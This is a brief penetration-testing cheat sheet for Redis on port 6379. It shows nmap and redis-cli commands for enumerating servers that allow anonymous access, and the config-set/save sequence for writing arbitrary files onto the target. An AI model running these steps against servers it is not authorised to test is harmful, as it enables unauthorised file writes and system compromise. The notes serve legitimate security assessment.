# TCP 6379: Redis

> Redis is an in-memory data structure project implementing a distributed, in-memory key-value database with optional durability. Redis supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, HyperLogLogs, bitmaps, streams, and spatial indexes.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Redis)</cite>

## General

[6379 - Pentesting Redis - HackTricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

## Enumeration

```bash
nmap --script redis-info -sV -p 6379 <ip>
```

Several times redis will be configured to be **accessible anonymously**.
```bash
redis-cli -h <ip>
```

```bash
info
config get *
```

## Write file

Change dir

```bash
config set dir <dir>
```

Set file name
```bash
config set dbfilename <file>
```

Set file contents
```bash
cat <local-file> | redis-cli -h <ip> -x set crackit
```

Write
```bash
save
```
